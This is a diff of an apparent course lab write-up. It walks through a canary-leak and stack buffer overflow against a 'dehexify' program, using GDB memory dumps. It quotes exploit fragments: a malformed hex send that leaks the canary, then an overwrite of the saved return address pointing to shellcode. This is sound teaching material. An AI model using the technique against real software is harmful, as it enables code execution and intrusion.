@@ -190,46 +190,45 @@ Stack level 0, frame at 0xffffd720:
 ```
 From this GDB output you can see the key important parts of the stack, starting at the bottom with `answer` at `0xffffd6ec`. Moving up you can see `buffer` at `0xffffd6fc`. They both have garbage currently since the program just started and they were initialized without any intial value. Below `buffer` is the canary, which—although cannot confirmed with GDB, was taught in lecture to be directly after all local variables on the stack. Using `info frame` you can figure out that the EBP is at `0xffffd718`. From lecture, the canary is `4` bytes, therefore the bytes in between the canary at `0xffffd70c` and the EBP at `0xffffd718` are just compiler padding. Then from the `info frame` output, you can see the EIP which is located at `0xffffd71c`. Moving onto the first step of the exploit:
 ```
-~                                                                                                        │(gdb) c
-~                                                                                                        │Continuing.
-~                                                                                                        │
-~                                                                                                        │Breakpoint 2, dehexify () at dehexify.c:36
-~                                                                                                        │36          c.answer[j] = 0;
-~                                                                                                        │(gdb) x/16x c.answer
-~                                                                                                        │0xffffd6ec:     0xa9eaeaea      0x1951a99a      0x0804d020      0x00000000
-~                                                                                                        │0xffffd6fc:     0x4141785c      0x4141785c      0x4141785c      0x0041785c
-~                                                                                                        │0xffffd70c:     0x1951a99a      0x0804d020      0x00000000      0xffffd728
-~                                                                                                        │0xffffd71c:     0x08049341      0x00000000      0xffffd740      0xffffd7bc
-~                                                                                                        │(gdb) p i
-~                                                                                                        │$2 = 24
-~                                                                                                        │(gdb) p j
-~                                                                                                        │$3 = 12
+(gdb) c
+Continuing.
 
+Breakpoint 2, dehexify () at dehexify.c:36
+36          c.answer[j] = 0;
+(gdb) x/16x c.answer
+0xffffd6ec:     0xa9eaeaea      0x1951a99a      0x0804d020      0x00000000
+0xffffd6fc:     0x4141785c      0x4141785c      0x4141785c      0x0041785c
+0xffffd70c:     0x1951a99a      0x0804d020      0x00000000      0xffffd728
+0xffffd71c:     0x08049341      0x00000000      0xffffd740      0xffffd7bc
+(gdb) p i
+$2 = 24
+(gdb) p j
+$3 = 12
 ```
 After the first part of the exploit (`p.send('\\xAA\\xAA\\xAA\\xA\n')`), `answer` and `buffer` have changed. The hex translates to what was sent in the `p.send` command. You can see `41`s scattered through `buffer` which is the byte representation of the letter `A`. I've also outputted `i` and `j` so you can see how `i` has hopped way past `j` which would aid in this exploit.
 ```
- 41 int main(void) {                                                                                     │(gdb) c
- 42     while (!feof(stdin)) {                                                                           │Continuing.
- 43         dehexify();                                                                                  │
- 44     }                                                                                                │Breakpoint 1, dehexify () at dehexify.c:20
- 45     return 0;                                                                                        │20          int i = 0, j = 0;
- 46 }                                                                                                    │(gdb) x/16x c.answer
-~                                                                                                        │0xffffd6ec:     0xa9eaeaea      0x1951a99a      0x0804d020      0x00000000
-~                                                                                                        │0xffffd6fc:     0x4141785c      0x4141785c      0x4141785c      0x0804cfe8
-~                                                                                                        │0xffffd70c:     0x1951a99a      0x0804d020      0x00000000      0xffffd728
-~                                                                                                        │0xffffd71c:     0x08049341      0x00000000      0xffffd740      0xffffd7bc
+(gdb) c
+Continuing.
+
+Breakpoint 1, dehexify () at dehexify.c:20
+20          int i = 0, j = 0;
+(gdb) x/16x c.answer
+0xffffd6ec:     0xa9eaeaea      0x1951a99a      0x0804d020      0x00000000
+0xffffd6fc:     0x4141785c      0x4141785c      0x4141785c      0x0804cfe8
+0xffffd70c:     0x1951a99a      0x0804d020      0x00000000      0xffffd728
+0xffffd71c:     0x08049341      0x00000000      0xffffd740      0xffffd7bc
 ```
 After continuing, nothing has changed, but the exploit has now obtained the canary through `p.recv(8)`. The program is run again from the second `p.send`.
 ```
-~                                                                                                        │(gdb) c
-~                                                                                                        │Continuing.
-~                                                                                                        │
-~                                                                                                        │Breakpoint 2, dehexify () at dehexify.c:36
-~                                                                                                        │36          c.answer[j] = 0;
-~                                                                                                        │(gdb) x/16x c.answer
-~                                                                                                        │0xffffd6ec:     0x41414141      0x41414141      0x41414141      0x00414141
-~                                                                                                        │0xffffd6fc:     0x41414141      0x41414141      0x41414141      0x00414141
-~                                                                                                        │0xffffd70c:     0x1951a99a      0x41414141      0x41414141      0x41414141
-~                                                                                                        │0xffffd71c:     0xffffd720      0xdb31c031      0xd231c931      0xb05b32eb
+(gdb) c
+Continuing.
+
+Breakpoint 2, dehexify () at dehexify.c:36
+36          c.answer[j] = 0;
+(gdb) x/16x c.answer
+0xffffd6ec:     0x41414141      0x41414141      0x41414141      0x00414141
+0xffffd6fc:     0x41414141      0x41414141      0x41414141      0x00414141
+0xffffd70c:     0x1951a99a      0x41414141      0x41414141      0x41414141
+0xffffd71c:     0xffffd720      0xdb31c031      0xd231c931      0xb05b32eb
 ```
 Now GDB reflects the effect of the second `p.send`, the bulk of the exploit. You can see both `answer` and `buffer` are filled with garbage, and then the canary value following immediately after `buffer` at `0xffffd70c`, and then more garbage after the canary to show that the canary was actually overwritten ("hopped"), and then at `0xffffd71c`, which recall was the EIP, is overwritten with the hex values from my `p.send`: `0xffffd720`. Then immediately following is the `SHELLCODE`. Exploit success.
